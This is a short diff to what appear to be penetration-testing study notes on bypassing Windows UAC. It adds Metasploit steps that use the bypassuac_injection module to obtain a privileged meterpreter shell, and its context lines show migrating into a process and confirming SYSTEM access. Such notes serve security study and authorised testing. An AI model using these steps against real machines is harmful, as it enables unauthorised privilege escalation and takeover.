@@ -61,4 +61,11 @@ Bypassing UAC With UACMe
 - ps [ list all the processes ]
 - migrate 688 [ here 688 is process number,as we are privileged we can migrate to any process ]
 - getuid [ this will show us NT AUTHORITY\SYSTEM ]
+#### using metasploit
+- search bypassuac
+- use exploit/windows/local/bypassuac_injection
+- set everything requires
+- set TARGET \ X64
+- run 
+- this will give us privileged meterpreter shell
   
